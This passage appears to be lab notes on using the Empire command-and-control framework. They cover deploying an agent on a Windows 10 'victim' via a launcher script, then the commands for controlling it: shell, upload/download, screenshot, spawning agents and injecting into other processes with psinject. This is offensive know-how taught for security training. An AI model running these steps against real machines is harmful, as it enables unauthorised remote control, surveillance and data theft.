**Agent**- The final payload retrieved by the stager that allows us to execute commands and interact with the system. 

After we have our listener and stager prepared, we need to deplot an agent on the victim.

In this example:
Once the agent is operation on target, it will setup AES ecrypted comms channel using the data portion of the HTTP GET and POST request.

Copy **launcher.bat** to the win10 workstation and execute from command prompt.

After successful execution of launcher script, an inital agent call will appear in our Empire session.

Display all active agents:
`agents`

Interact with agent by agent name:
`interact <agent_name>`

Run commands:
`help`
`sysinfo`
`upload`
`download`
`screenshot`
etc.

Run shell commands:
`shell`

Create an additional agent:
`spawn`

Migrate payload to different process:
`ps`
`psinject <listener_name> <PID>`

Unlike meterpereter payload, once we migrate the original Empire agent remains active and we must manually switch to newly created agent:
`agents`
`interact <new_agent_name>`